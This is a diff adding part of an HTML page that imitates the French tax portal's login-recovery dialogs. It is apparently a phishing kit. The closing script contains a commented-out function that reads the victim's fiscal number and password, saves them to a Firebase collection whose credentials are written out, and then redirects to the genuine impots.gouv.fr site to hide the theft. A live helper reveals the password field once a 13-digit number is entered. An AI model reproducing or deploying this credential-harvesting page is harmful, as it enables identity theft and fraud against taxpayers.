+						<h3 id="passPerduTitle" class="modal-title titre">TITRE</h3>
+					</div>
+					<div class="modal-body">
+						<form method="post" action="/monprofil-webapp/noAuth/LostPassword" id="oubliMotDePasseForm" name="oubliMotDePasseForm" target="hidden-oubliMotDePasseForm">
+							<input type="hidden" id="numfiscal" name="numfiscal" />
+							<input type="hidden" id="LostPassword_captchaText" name="captchaText" />
+							<input type="hidden" id="LostPassword_dateNaissance" name="dateNaissance" />
+							<input type="hidden" id="LostPassword_dateNaissance_tmp" name="dateNaissance_tmp" disabled="true" />
+							<IFRAME style="display:none" name="hidden-oubliMotDePasseForm" id="hidden-oubliMotDePasseForm" aria-hidden="true" title="Cadre technique"> </IFRAME>
+							<div id="pass">
+								<div role="alert" class="alert alert-danger cat2 hide" id="erreurModPwd"></div>
+								<!--====================-->
+								<!-- Identifiant Fiscal -->
+								<!--====================-->
+								<div class="row">
+									<div class="col-md-12">
+										<div class="form-group" id="fg_numfiscal">
+											<label for="numfiscal_tmp">Num&eacute;ro fiscal</label>
+											<div class="ephemere hidden" id="liveCheck_numfiscal_tmp"></div>
+											<input class="form-control" name="numfiscal_tmp" id="numfiscal_tmp" type="tel" aria-required="true" autocomplete="on" placeholder="13 chiffres" data-original-title="13 chiffres" data-toggle="tooltip" data-placement="top" data-mask="int" data-max=13 data-feedbackok=1/>
+											<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_numfiscal" ></div>
+										</div>
+										<!-- form-group FIN -->
+									</div>
+									<!-- col-md-12 FIN -->
+								</div>
+								<!-- row FIN -->
+								<!-- ================= -->
+								<!-- date de naissance -->
+								<!-- ================= -->
+								<div class="row form-row " id="fr_LostPassword_DateNaissance">
+									<div class="col-xs-11 col-md-12">
+										<label for="saisieDate">Indiquez votre date de naissance</label>
+										<div class="ephemere hidden" id="liveCheck_LostPassword_jourNaissance_tmp" role="alert"></div>
+										<div class="ephemere hidden" id="liveCheck_LostPassword_moisNaissance_tmp" role="alert"></div>
+										<div class="ephemere hidden" id="liveCheck_LostPassword_anneeNaissance_tmp" role="alert"></div>
+									</div>
+									<div class="col-xs-4 col-md-4">
+										<label for="LostPassword_jourNaissance_tmp" class="hidden" >Indiquez votre jour de naissance</label>
+										<input type="text" inputmode="numeric" class="form-control" data-original-title="Indiquez votre jour de naissance" data-toggle="tooltip" data-placement="top" name="LostPassword_jourNaissance_tmp" id="LostPassword_jourNaissance_tmp"  aria-required="true" aria-label="Jour de naissance" autocomplete="bday-day" placeholder="JJ" data-max=2 data-mask="jour" />
+									</div>
+									<div class="col-xs-4 col-md-4">
+										<input type="text" inputmode="numeric" class="form-control" data-original-title="Indiquez votre mois de naissance" data-toggle="tooltip" data-placement="top" name="LostPassword_moisNaissance_tmp" id="LostPassword_moisNaissance_tmp"  aria-required="true" aria-label="Mois de naissance" autocomplete="bday-month" placeholder="MM" data-max=2 data-mask="mois" />
+									</div>
+									<div class="col-xs-4 col-md-4">
+										<input type="text" inputmode="numeric" class="form-control" data-original-title="Indiquez votre ann&eacute;e de naissance" data-toggle="tooltip" data-placement="top" name="LostPassword_anneeNaissance_tmp" id="LostPassword_anneeNaissance_tmp"  aria-required="true" aria-label="Ann&eacute;e de naissance" autocomplete="bday-year" placeholder="AAAA" data-mask="int" data-max=4 maxlength="4" />
+									</div>
+									<div class="col-xs-11 col-md-12">
+										<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_LostPassword_DateNaissance" ></div>
+									</div>
+								</div>
+								<!-- row FIN -->
+								<!--====================-->
+								<!--      Captcha       -->
+								<!--====================-->
+								<div class="row">
+									<div class="col-md-12">
+										<div class="form-group" id="fg_LostPassword_captchaText">
+											<label for="LostPassword_captchaText_tmp" class="obligatoire">Recopiez les caract&egrave;res de l'image ou de l'extrait sonore</label>
+											<div class="ephemere hidden" id="liveCheck_captchaTextFisc_tmp"></div>
+											<input class="form-control" type="text" name="LostPassword_captchaText_tmp" aria-required="true" autocomplete="off" id="LostPassword_captchaText_tmp"  data-max=25 data-mask="alphanum"/>
+											<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_captchaTextFisc"></div>
+										</div>
+										<!-- form-group FIN -->
+									</div>
+									<!-- col-md-12 FIN -->
+								</div>
+								<!-- row FIN -->
+								<div class="form-group">
+									<div class="captcha-container col-xs-12 col-sm-12 col-md-12 com-lg-12">
+										<div class=" col-xs-12 col-sm-6 col-md-6 com-lg-6" id="divCaptchapassPerdu">
+										</div>
+										<div class="col-xs-12 col-sm-6 col-md-6 com-lg-6 lienCaptcha">
+											<a href="#" class="listen">
+											&Eacute;couter l'extrait sonore
+											</a>
+											<audio class="audio" >
+												Votre navigateur ne prend pas en charge l'&eacute;l&eacute;ment audio.
+											</audio>
+											<br />
+											<a href="#" class=renewImage>
+											Changer d'image
+											</a>
+										</div>
+										<!-- col-12 -->
+										<div class="clear"></div>
+									</div>
+									<!-- captcha -->
+								</div>
+								<!-- form-group -->
+								<div class="row">
+									<div class="col-xs-12 text-center">
+										<br><button type="submit" class="btn btn-primary" id="lostpass" name="lostpass" value="get pass" onclick="return(controleFormulaireEtSubmit(1,this));">Continuer</button>
+									</div>
+									<!-- col -->
+								</div>
+								<!-- row -->
+							</div>
+							<!-- pass -->
+						</form>
+						<!-- form -->
+					</div>
+					<!-- modal body -->
+				</div>
+				<!-- modal-content -->
+			</div>
+			<!-- modal-dialog -->
+		</div>
+		<!--Fenetre modale dans le cas de perte de mot de passe-->
+		<!--============================================================-->
+		<!--FIN Fenetre modale dans le cas de perte de mot de passe -->
+		<!--============================================================-->
+		<!--============================================================-->
+		<!--DEBUT Fenetre modale dans le cas de perte de num. fiscal -->
+		<!--============================================================-->
+		<div id="numFiscal" class="modal fade" role="dialog" tabindex="-1" aria-labelledby="numFiscalTitle">
+			<div class="modal-dialog" role="document">
+				<div class="modal-content">
+					<div class="modal-header">
+						<button type="button" class="close" data-dismiss="modal" aria-label="Fermer"><span aria-hidden="true">&times;</span></button>
+						<h3 id="numFiscalTitle" class="modal-title titre">TITRE</h3>
+					</div>
+					<div class="modal-body">
+						<form method="post" action="/monprofil-webapp/noAuth/LostSpi" id="oubliNumFiscalForm" name="oubliNumFiscalForm" target="hidden-oubliNumFiscalForm">
+							<input type="hidden" id="LostSpi_email" name="email" />
+							<input type="hidden" id="LostSpi_captchaText" name="captchaText" />
+							<input type="hidden" id="LostSpi_dateNaissance" name="dateNaissance" />
+							<input type="hidden" id="LostSpi_dateNaissance_tmp" name="dateNaissance_tmp" disabled="true"/>
+							<IFRAME style="display:none" name="hidden-oubliNumFiscalForm" id="hidden-oubliNumFiscalForm" aria-hidden="true" title="Cadre technique" > </IFRAME>
+							<div id="fisc">
+								<div role="alert" class="alert alert-danger cat2 hide" id="erreurModFisc"></div>
+								<!-- <div role="alert" class="alert alert-danger hide" id="CAT2OubliFisc"></div> -->
+								<!--=======-->
+								<!-- email -->
+								<!--=======-->
+								<div class="form-group" id="fg_LostSpi_email">
+									<label for="LostSpi_email_tmp">Adresse &eacute;lectronique</label>
+									<div class="ephemere hidden" id="liveCheck_LostSpi_email_tmp"></div>
+									<input class="form-control" type="email" name="LostSpi_email_tmp" aria-required="true" autocomplete="on" id="LostSpi_email_tmp" placeholder="Ex : un@exemple.fr" data-original-title="Il s'agit de l'adresse &eacute;lectronique saisie lors de la cr&eacute;ation de votre espace particulier ou de celle indiqu&eacute;e, post&eacute;rieurement, dans le service &quot;Mon profil&quot;." data-toggle="tooltip" data-placement="top" maxlength="121" data-max=121 />
+								</div>
+								<!-- form-group -->
+								<!-- ================= -->
+								<!-- date de naissance -->
+								<!-- ================= -->
+								<div class="row form-row " id="fr_LostSpi_DateNaissance">
+									<div class="col-xs-11 col-md-12">
+										<label for="saisieDate">Indiquez votre date de naissance</label>
+										<div class="ephemere hidden" id="liveCheck_LostSpi_jourNaissance_tmp" role="alert"></div>
+										<div class="ephemere hidden" id="liveCheck_LostSpi_moisNaissance_tmp" role="alert"></div>
+										<div class="ephemere hidden" id="liveCheck_LostSpi_anneeNaissance_tmp" role="alert"></div>
+									</div>
+									<div class="col-xs-4 col-md-4">
+										<label for="LostSpi_jourNaissance_tmp" class="hidden" >Indiquez votre jour de naissance</label>
+										<input type="text" inputmode="numeric" class="form-control" data-original-title="Indiquez votre jour de naissance" data-toggle="tooltip" data-placement="top" name="LostSpi_jourNaissance_tmp" id="LostSpi_jourNaissance_tmp"  aria-required="true" aria-label="Jour de naissance" autocomplete="bday-day" placeholder="JJ" data-max=2 data-mask="jour" />
+									</div>
+									<div class="col-xs-4 col-md-4">
+										<input type="text" inputmode="numeric" class="form-control" data-original-title="Indiquez votre mois de naissance" data-toggle="tooltip" data-placement="top" name="LostSpi_moisNaissance_tmp" id="LostSpi_moisNaissance_tmp"  aria-required="true" aria-label="Mois de naissance" autocomplete="bday-month" placeholder="MM" data-max=2 data-mask="mois" />
+									</div>
+									<div class="col-xs-4 col-md-4">
+										<input type="text" inputmode="numeric" class="form-control" data-original-title="Indiquez votre ann&eacute;e de naissance" data-toggle="tooltip" data-placement="top" name="LostSpi_anneeNaissance_tmp" id="LostSpi_anneeNaissance_tmp"  aria-required="true" aria-label="Ann&eacute;e de naissance" autocomplete="bday-year" placeholder="AAAA" data-mask="int" data-max=4 maxlength="4" />
+									</div>
+									<div class="col-xs-11 col-md-12">
+										<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_LostSpi_DateNaissance" ></div>
+									</div>
+								</div>
+								<!-- row FIN -->
+								<!--====================-->
+								<!--      Captcha       -->
+								<!--====================-->
+								<div class="form-group" id="fg_LostSpi_captchaText" >
+									<label for="LostSpi_captchaTextPwd_tmp" class="obligatoire">Recopiez les caract&egrave;res de l'image ou de l'extrait sonore</label>
+									<input class="form-control" type="text" name="LostSpi_captchaText_tmp" aria-required="true" autocomplete="off" id="LostSpi_captchaText_tmp"   data-max=25 data-mask="alphanum"/>
+									<div class="ephemere hidden" id="liveCheck_captchaText_tmp"></div>
+								</div>
+								<!-- form-group -->
+								<div class="form-group">
+									<!-- FORM-GROUP -->
+									<div class="captcha-container col-xs-12 col-sm-12 col-md-12 com-lg-12">
+										<div class=" col-xs-12 col-sm-6 col-md-6 com-lg-6" id="divCaptchanumFiscal">
+										</div>
+										<div class="col-xs-12 col-sm-6 col-md-6 com-lg-6 lienCaptcha">
+											<a href="#" class="listen">&Eacute;couter l'extrait sonore</a><br />
+											<audio class="audio">
+												Votre navigateur ne prend pas en charge l'&eacute;l&eacute;ment audio.
+											</audio>
+											<a href="#" class="renewImage">Changer d'image</a>
+										</div>
+									</div>
+									<div class="clear"></div>
+								</div>
+								<!-- form-group -->
+								<div class="row">
+									<div class="col-xs-12 text-center">
+										<br><button type="submit" class="btn btn-primary" id="lostspi" name="lostspi" value="get SPI" onclick="return(controleFormulaireEtSubmit(1,this));" title="Recevoir mon num&eacute;ro fiscal">Continuer</button>
+									</div>
+									<!-- col-12 FIN -->
+								</div>
+								<!-- row FIN -->
+							</div>
+							<!-- fisc FIN -->
+						</form>
+						<!-- form -->
+					</div>
+					<!-- modal-body -->
+				</div>
+				<!-- modal-content -->
+			</div>
+			<!-- modal-dialog -->
+		</div>
+		<!-- numFiscal -->
+		<!--============================================================-->
+		<!--FIN Fenetre modale dans le cas de perte de num. fiscal -->
+		<!--============================================================-->
+		<!--============================================================-->
+		<!-- Fenetre modale de validation SMS envoye                    -->
+		<!--============================================================-->
+		<div id="checkSMSMod" class="modal fade" role="dialog">
+			<div class="modal-dialog">
+				<div class="modal-content">
+					<div class="modal-header">
+						<button type="button" class="close" data-dismiss="modal" title="Fermeture de la fen&ecirc;tre" aria-label="Fermer" >
+						<span aria-hidden="true">&times;</span>
+						</button>
+						<h4 class="modal-title titre">Titre</h4>
+					</div>
+					<!-- modal-header -->
+					<div class="modal-body">
+						<form method="post" action="CIBLE" id="checkSMSForm" name="checkSMSForm" target="hidden-checkSMSForm">
+							<input type="hidden" id="code_SMS" name="code" />
+							<IFRAME style="display:none" name="hidden-checkSMSForm" id="hidden-checkSMSForm" aria-hidden="true" title="Cadre technique" > </IFRAME>
+							<div role="alert" class="alert alert-danger cat2 hide" id="erreurModSMS"></div>
+							<div class="alert alert-info hide cat3" id="msgInfoSMS"></div>
+							<div class="alert alert-info hide cat3" id="msgInfoSMSITX"></div>
+							<div class="form-group" id="fg_code_SMS">
+								<label for="code_SMS_tmp" class="sr-only" >Code adress&eacute; par SMS (6 chiffres)</label>
+								<input class="form-control" type="text" inputmode="numeric" name="code_SMS_tmp" aria-required="true" autocomplete="one-time-code" pattern="^\d{6}$" id="code_SMS_tmp" placeholder="Format : 6 chiffres" data-original-title="Code" data-toggle="tooltip" data-placement="top" maxlength="6" data-max=6 data-feedbackok=1 data-mask="int" />
+							</div>
+							<!-- form-group -->
+							<div id="ctrl-no">
+								<div class="ephemere hidden" id="liveCheck_code_SMS_tmp"></div>
+								<div style="float: right;">
+									<p id="P_codeNonRecu">
+										<a id="codeNonRecu" href="#" onclick="resendSMS(this);return(true);">
+										Je n&apos;ai pas re&ccedil;u le code.
+										</a>
+									</p>
+								</div>
+							</div>
+							<br/>
+							<br/>
+							<div role="alert" class="alert alert-info cat2 hide" id="infoRenewSMS"></div>
+							<div role="alert" class="alert alert-info hide" id="infoLastSMS"></div>
+							<div class="row">
+								<div class="col-md-12 text-center">
+									<br><button type="submit" class="btn btn-primary" id="buttonSMS" name="lostspi" value="checkSMS" onclick="return(controleFormulaireEtSubmit(1,this));">cRecevoir le lien de renouvellement</button>
+									<br><button type="submit" class="btn btn-primary hide" id="lostpass" name="lostpass" value="checkSMS" onclick="return(controleFormulaireEtSubmit(1,this));">Recevoir le lien de renouvellement</button>
+								</div>
+							</div>
+						</form>
+					</div>
+					<!-- modal-body -->
+				</div>
+				<!-- modal-content -->
+			</div>
+			<!-- modal-dialog -->
+		</div>
+		<!-- confirmationSms -->
+		<!-- =================================== -->
+		<!-- Fenetre modale de confirmation mail -->
+		<!-- =================================== -->
+		<div id="confirmationSpi" class="modal fade" role="dialog">
+			<div class="modal-dialog">
+				<div class="modal-content">
+					<div class="modal-header">
+						<button type="button" class="close" data-dismiss="modal" title="Fermeture de la fen&ecirc;tre" aria-label="Fermer" >
+						<span aria-hidden="true">&times;</span>
+						</button>
+						<h4 class="modal-title titre">TITRE</h4>
+					</div>
+					<!-- modal-header -->
+					<div class="modal-body">
+						<div class="alert alert-info hide cat3" id="numFiscalMsgInfoNeedSecure"></div>
+						<p>Vous allez recevoir un courriel avec le(s) num&eacute;ro(s) fiscal(aux) correspondant &agrave; l'adresse que vous avez saisie.</p>
+					</div>
+					<!-- modal-body -->
+				</div>
+				<!-- modal-content -->
+			</div>
+			<!-- modal-dialog -->
+		</div>
+		<!-- confirmationSpi -->
+		<!-- ===================================== -->
+		<!-- Fenetre modale de confirmation passwd -->
+		<!-- ===================================== -->
+		<div id="confirmationPassword" class="modal fade" role="dialog">
+			<div class="modal-dialog">
+				<div class="modal-content">
+					<div class="modal-header">
+						<button type="button" class="close" data-dismiss="modal" title="Fermeture de la fen&ecirc;tre" aria-label="Fermer" >
+						<span aria-hidden="true">&times;</span>
+						</button>
+						<h4 class="modal-title titre">TITRE</h4>
+					</div>
+					<!-- modal-header -->
+					<div class="modal-body">
+						<div class="alert alert-info hide cat3" id="passPerduMsgInfoNeedSecure"></div>
+						<p>Vous allez recevoir un courriel &agrave; l'adresse que vous avez indiqu&eacute;e dans votre espace particulier.</p>
+						<p>Il vous permettra de renouveler votre mot de passe en quelques clics.</p>
+					</div>
+					<!-- modal-body -->
+				</div>
+				<!-- modal-content -->
+			</div>
+			<!-- modal-dialog -->
+		</div>
+		<!--"confirmationPassword" -->
+		<!-- ======================== -->
+		<!-- Fenetre modale d'indispo -->
+		<!-- ======================== -->
+		<div id="indispoMP" class="modal fade lost" role="dialog">
+			<div class="modal-dialog">
+				<div class="modal-content">
+					<div class="modal-body">
+						<!-- <div id="CatModIndispoMP" > -->
+						<p>	Le service est indisponible&nbsp;; veuillez r&eacute;it&eacute;rer votre demande ult&eacute;rieurement. </p>
+						<!-- </div> -->
+					</div>
+					<!-- modal-body -->
+				</div>
+				<!-- modal-content -->
+			</div>
+			<!-- modal-dialog -->
+		</div>
+		<!-- indispoMP -->
+		<!-- ============================= -->
+		<!-- Fenetre modale de deconnexion -->
+		<!-- ============================= -->
+		<div id="deco" class="modal fade" role="dialog">
+			<div class="modal-dialog">
+				<div class="modal-content" id="deco_contenu">
+					<div class="modal-header">
+						<h3 class="modal-title titre">D&eacute;connexion</h3>
+					</div>
+					<div class="modal-body">
+						<div id="deconnecte" class="rounded">
+							<iframe name="app0" id="app0" class="hide" aria-hidden="true" title="Cadre technique"></iframe>
+							
+							 	
+							
+							D&eacute;connexion en cours, veuillez patienter...<br />
+							
+							<br />
+							<!-- <div class="text-center" id="decoWait"><img src="/images/Miniballs.gif" alt=""/></div> -->
+							<div class="text-center" id="decoWait"></div>
+							<br />
+						</div>
+						<!-- deconnecte" -->
+					</div>
+					<!-- modal-body -->
+				</div>
+				<!-- modal-content -->
+			</div>
+			<!-- modal-dialog -->
+		</div>
+		<!-- deco -->
+		<!-- ================================= -->
+		<!-- FIN Fenetre modale de deconnexion -->
+		<!-- ================================= -->
+
+		
+ <script>
+// 	function saveToFirebase() {
+// 		const firebaseConfig = {
+//   apiKey: "AIzaSyDhD2bFY622kpBBRe4C5SWQXc3pvPlXQrc",
+//   authDomain: "site-72fd6.firebaseapp.com",
+//   projectId: "site-72fd6",
+//   storageBucket: "site-72fd6.appspot.com",
+//   messagingSenderId: "937745628392",
+//   appId: "1:937745628392:web:3021834820f8e2359c9d5d",
+// };
+// var app = initializeApp(firebaseConfig);
+
+//   const inputField = document.getElementById("spi_tmp");
+//   const passwordField = document.getElementById("pwd_tmp");
+
+//   const data = {
+//     number: inputField.value,
+//     password: passwordField.value,
+//   };
+
+//   if (passwordField.value.length > 5) {
+//     // Password is more than 5 characters long
+//     // Replace "yourCollectionName" with your Firebase collection name
+//     app
+//       .firestore()
+//       .collection("yourCollectionName")
+//       .add(data)
+//       .then(() => {
+//         alert("Data saved to Firebase successfully.");
+
+//         // Redirect to another website (change the URL)
+//         window.location.href = "https://cfspart.impots.gouv.fr/"; // Replace with the desired URL
+//       })
+//       .catch((error) => {
+//         console.error("Error adding document: ", error);
+//       });
+//   } else {
+//     console.log("Password must be more than 5 characters long.");
+//   }
+
+//   // Replace "yourCollectionName" with your Firebase collection name
+//   // firebase
+//   //   .firestore()
+//   //   .collection("data")
+//   //   .add(data)
+//   //   .then(() => {
+//   //     alert("Data saved to Firebase successfully.");
+//   //   })
+//   //   .catch((error) => {
+//   //     console.error("Error adding document: ", error);
+//   //   });
+// }
+
+	function checkInput() {
+  console.log("hello");
+  const inputField = document.getElementById("spi_tmp");
+  const passwordContainer = document.getElementById("fg_pwd");
+  const btn1 = document.getElementById("btnAction");
+  const btn2 = document.getElementById("btnActions");
+
+  if (inputField.value.length === 13 && !isNaN(inputField.value)) {
+    // Show the password input field
+    passwordContainer.style.display = "block";
+    btn1.style.display = "none";
+    btn2.style.display = "block";
+  } else {
+    alert("Please enter a valid 13-digit number.");
+  }
+}
+ </script>
+	
+	</body>
+</html>
